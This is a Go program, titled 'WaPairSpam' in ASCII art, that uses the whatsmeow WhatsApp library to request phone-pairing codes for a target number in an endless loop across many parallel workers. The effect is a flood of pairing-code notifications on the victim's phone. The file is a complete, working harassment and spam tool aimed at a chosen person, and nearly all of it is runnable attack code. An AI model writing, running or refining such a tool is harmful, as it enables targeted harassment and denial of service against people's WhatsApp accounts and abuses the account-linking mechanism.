package main

import (
	"flag"
	"fmt"
	"runtime"
	"strings"
	"sync"

	"github.com/fatih/color"
	_ "github.com/mattn/go-sqlite3"
	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/store/sqlstore"
	waLog "go.mau.fi/whatsmeow/util/log"
)

var asciiArt = `
 __      __       __________        .__        _________                     
/  \    /  \_____ \______   \_____  |__|______/   _____/__________    _____  
\   \/\/   /\__  \ |     ___/\__  \ |  \_  __ \_____  \\____ \__  \  /     \ 
 \        /  / __ \|    |     / __ \|  ||  | \/        \  |_> > __ \|  Y Y  \
  \__/\  /  (____  /____|    (____  /__||__| /_______  /   __(____  /__|_|  /
       \/        \/               \/                 \/|__|       \/      \/ 
`

func SentCode(target string, done chan bool, wg *sync.WaitGroup) {
	defer wg.Done()

	for range done {
		container, err := sqlstore.New("sqlite3", "file:wapairspam.db?_foreign_keys=on", nil)
		if err != nil {
			panic(err)
		}

		deviceStore, err := container.GetFirstDevice()
		if err != nil {
			panic(err)
		}

		clientLog := waLog.Stdout("Client", "INFO", true)
		client := whatsmeow.NewClient(deviceStore, clientLog)

		err = client.Connect()
		if err != nil {
			color.Red(err.Error())
			return
		}

		code, err := client.PairPhone(target, true, whatsmeow.PairClientChrome, "Chrome (Linux)")
		if err != nil {
			color.Red(err.Error())
			continue
		}

		color.Green(fmt.Sprintf("Sent to %v Code: %v", target, code))

		client.Disconnect()
	}
}

func main() {
	color.Magenta(asciiArt)

	var target string
	var workers int
	var wg sync.WaitGroup
	done := make(chan bool)

	// Flags
	flag.StringVar(&target, "target", "", "Target number with country code and DDD")
	flag.IntVar(&workers, "threads", runtime.NumCPU(), "Num threads (optional)")
	flag.Parse()

	if strings.TrimSpace(target) == "" {
		flag.Usage()
		return
	}

	fmt.Printf("Using %d Workers.\n", workers)

	for i := 0; i <= workers; i++ {
		wg.Add(1)
		go SentCode(target, done, &wg)
	}

	for {
		done <- true
	}

	close(done)

	wg.Wait()
}
